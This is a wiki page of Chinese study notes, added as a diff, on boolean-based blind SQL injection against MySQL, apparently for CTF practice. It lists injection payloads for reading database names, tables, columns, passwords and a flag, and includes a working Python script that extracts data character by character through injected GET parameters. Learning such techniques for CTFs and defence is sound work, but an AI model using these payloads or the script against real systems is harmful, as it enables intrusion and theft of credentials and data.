@@ -1,0 +1,108 @@
+Content-Type: text/x-zim-wiki
+Wiki-Format: zim 0.6
+Creation-Date: 2024-11-30T17:54:06+08:00
+
+====== 盲注 ======
+Created 星期六 30 十一月 2024
+
+如果查询没有报错，或不能直接获取信息，可以使用盲注猜测数据
+
+https://dev.mysql.com/doc/refman/8.4/en/built-in-function-reference.html
+
+布尔盲注【根据是否有回显，判断构造的表达式是否为真】
+id = -1 OR 1=1; 有回显，说明注入点格式猜测正确，可以利用布尔盲注（假设不存在id=-1的条目）
+id = 1 AND 1=1; 有回显，说明存在id=1的条目
+OR和AND也可以用 || 和 && 替换
+1=1也可以用(true)替换
+
+下面的语句，如果id存在，则用AND，如果不存在则用OR
+* LENGTH(str): int
+	判断字段长度：二分法 AND LENGTH(username)<NUM 或 <=NUM
+* SUBSTR(str, pos, len) 注意pos从1开始
+	爆破字符，推断字符串：
+		id = 1 AND SUBSTR(username,1,1) = 'x'
+	优化：使用ASCII函数将字符转换为ascii码，然后二分查找。
+		id = 1 AND ASCII(SUBSTR(username,1,1)) < num
+		ascii码可见字符范围：32~126
+	爆破到用户名后，爆破密码列：
+		id = 1 AND SUBSTR((SELECT password FROM users WHERE username='admin'), 1, 1)='a'
+	替换某个字符
+		UPDATE user SET username=concat(SUBSTR(username,1,3),'***',SUBSTR(username,7)) WHERE username='admin'
+* LOCATE(substr,str) LOCATE(substr, str, pos)：查找字符串首次出现的位置。pos从1开始。返回0表示未找到。
+	AND LOCATE('xxx', database()) > 0
+
+可以爆破的信息/payload （写脚本爆破，可以用=号一个个判断，也可以二分）（ascii码可见字符范围：32~126）：
+查询数据库信息、连接数据库的"用户名@地址"、当前库名：
+ascii(substr(concat_ws(' ', @@version,@@datadir,user(),database()), _i, 1)) <= _n
+
+当前库名：
+ascii(substr(database(), i, 1)) <= n
+
+所有数据库名：
+ascii(substr((select group_concat(schema_name) FROM information_schema.schemata), i, 1)) <= n
+或
+SELECT group_concat(DISTINCT+table_schema) FROM information_schema.columns
+
+获取当前数据库的所有表名：
+SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()
+或
+SELECT group_concat(DISTINCT+table_name) FROM information_schema.columns WHERE table_schema=database()
+
+获取指定表的所有列名：
+SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='xxx'
+
+获取flag表中的flag列：
+select group_concat(flag) from flag
+
+模板脚本（有空可以研究一下sqlmap能不能做到）
+{{{code: lang="python3" linenumbers="False"
+import requests
+import time
+import urllib3
+urllib3.disable_warnings()
+
+
+url = 'https://e9d6515f-4116-4a52-8344-73a3cd0b745f.challenge.ctf.show/'
+url = 'http://localhost/'
+SLEEP = 0
+ASCII_EDGE = (31, 127)  # 可见字符范围为32~126，超出这个范围说明没找到
+SEARCH_START = 1
+MAX_SEARCH_LEN = 100  # ctfshow{90d30ec4-9bf7-428f-9fd6-8bab4967cf11}
+
+def binsearch(l, r, test_func):
+    while l < r:
+        m = (l + r) // 2
+        if test_func(m):
+            r = m
+        else:
+            l = m + 1
+    return l
+
+def check(payload):
+    resp = requests.get(url + payload, verify=False)
+    # 修改点1
+    return 'admin' in resp.text
+    return 'By Rudyard' in resp.text
+
+def test_func(_i, _n):
+    # 修改点2
+    payload = f"?id=-1||ascii(substr(concat_ws(' ', @@version,@@datadir,user(),database()), {_i}, 1)) <= {_n}"
+    payload = f'?id=-1||ascii(substr(database(), {_i}, 1)) <= {_n}'
+    payload = f'?id=-1||ascii(substr((SELECT group_concat(schema_name) FROM information_schema.schemata), {_i}, 1)) <= {_n}'
+    payload = f'?id=-1||ascii(substr((SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()), {_i}, 1)) <= {_n}'
+    payload = f"?id=-1||ascii(substr((SELECT group_concat(column_name) FROM information_schema.columns WHERE table_name='users'), {_i}, 1)) <= {_n}"
+    payload = f"?id=-1||ascii(substr((SELECT flag FROM flag), {_i}, 1)) <= {_n}"
+    return check(payload)
+
+if __name__ == '__main__':
+    for i in range(SEARCH_START, MAX_SEARCH_LEN):
+        time.sleep(SLEEP)
+        ret = binsearch(ASCII_EDGE[0], ASCII_EDGE[1], lambda n: test_func(i, n))
+        if ret in ASCII_EDGE:
+            # 没找到，说明长度已经超了
+            break
+        print(chr(ret), end='')
+}}}
+
+
+
